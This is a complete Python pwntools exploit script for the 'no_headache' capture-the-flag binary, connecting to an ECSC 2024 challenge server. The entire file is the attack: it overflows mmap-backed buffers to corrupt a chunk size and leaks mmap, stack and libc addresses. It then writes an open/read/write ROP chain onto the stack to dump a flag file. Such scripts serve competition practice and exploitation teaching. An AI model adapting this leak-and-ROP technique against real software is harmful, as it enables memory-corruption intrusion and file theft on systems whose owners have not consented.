#!/usr/bin/env python3

from pwn import *

elf = ELF("./no_headache_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ('kgx', '-e')

global r
def conn():
    if args.REMOTE:
        r = remote("noheadache.challs.open.ecsc2024.it", 38004)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b main
                                breakrva 0x290D
                                breakrva 0x2281
                                breakrva 0x298F

                                ignore 1 20
                                ignore 2 20
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r

def create():
    global r
    r.sendlineafter(b'> ', b'n')

def delete(idx: int):
    global r
    r.sendlineafter(b'> ', b'd')
    r.sendlineafter(b'Index: ', str(idx).encode())

def edit(content: bytes):
    global r
    r.sendlineafter(b'> ', b's')
    r.sendafter(b'(format: foo=bar;baz=123;...):\n', content)

def read(idx: int) -> bytes:
    r.sendlineafter(b'> ', b'p')
    r.sendlineafter(b'Index: ', str(idx).encode())
    
    r.recvuntil(b"{\n")
    out = b""
    for line in r.recvuntil(b"}\n", drop=True).split(b'\n'):
        out += line[2:line.find(b"\": \"")] + b'\x00' + line[line.find(b"\": \"")+4:line.find(b"\",")] + b"\x00"

    return out

def exit_main():
    r.sendlineafter(b'> ', b'e')

def main():
    global r
    r = conn()

    path = b"/home/user/flag"

    create()
    edit(b'a'*(0x1000-0x11-len(path)) + path + b'\n')
    create()
    edit(b'b'*(0x1000-0x11) + b'\n')
    log.info("First mmaped region filled")

    create()
    edit(b'c'*(0x1000-0x12-0x4) + b'=b=\x58\n')
    log.info("Size of first block overwritten")

    leak = read(2)
    mmap_leak = u64(leak[0xff8:0x1000].strip().ljust(8, b'\x00'))
    log.success(f"Leaked mmap region address: {hex(mmap_leak)}")

    # leak stack and libc
    stack_leak = u64(leak[0x2a30:0x2a38].strip().ljust(8, b'\x00'))
    log.success(f"Leaked stack address: {hex(stack_leak)}")

    libc.address = u64(leak[0x26a0:0x26a8].strip().ljust(8, b'\x00')) - 0x21b580
    log.success(f"Leaked Libc base: {hex(libc.address)}")

    # This only works locally
    # elf.address = u64(leak[0x57d0:0x57d8].strip().ljust(8, b'\x00')) - 0x745d
    # log.success(f"Leaked Pie base: {hex(elf.address)}")

    # rop
    log.info(f"ROP starting address: {hex(stack_leak-0x28)}")
    edit(b'c'*(0x1000-0x12-0x2-0xa-0x8) + b"=" + b"a"*10 + b"=" + p64(stack_leak-0x38) + b"\n")

    delete(0)
    delete(0)
    delete(0)

    payload = bytearray(flat([
        libc.address + 0x2a3e5,     # pop rdi; ret;
        mmap_leak +0xfff-len(path), # &path
        libc.address + 0x2be51,     # pop rsi; ret;
        0,                          # 0
        libc.sym.open,              # open@glibc

        libc.address + 0x2be51,     # pop rsi; ret;
        mmap_leak,                  # read_path
        libc.address + 0x11f2e7,    # pop rdx ; pop r12 ; ret
        0x100,                      # n_bytes
        0x0,                        # 0
        libc.address + 0x2a3e5,     # pop rdi; ret;
        0x3,                        # fd
        libc.sym.read,              # read@glibc

        libc.address + 0x2a3e5,     # pop rdi; ret;
        1,                          # stdout
        libc.address + 0x2be51,     # pop rsi; ret;
        mmap_leak,                  # read_path
        libc.sym.write,             # write@glibc

        libc.address + 0x2a3e5,     # pop rdi; ret;
        0,                          # 0
        libc.sym.exit               # exit@glibc
    ]))

# 0x15e8f4: mov rdi, rbx; xor eax, eax; call rcx;
# 0x3d1ee: pop rcx; ret; 

    flag = False
    for i in range(len(payload)):
        if payload[i] == 0:
            payload[i] = ord(b';' if flag else b'=')
            flag = not flag
    

    edit(bytes(payload) + b";\n")
    log.info("Payload sent")
    
    exit_main()

    r.interactive()


if __name__ == "__main__":
    main()
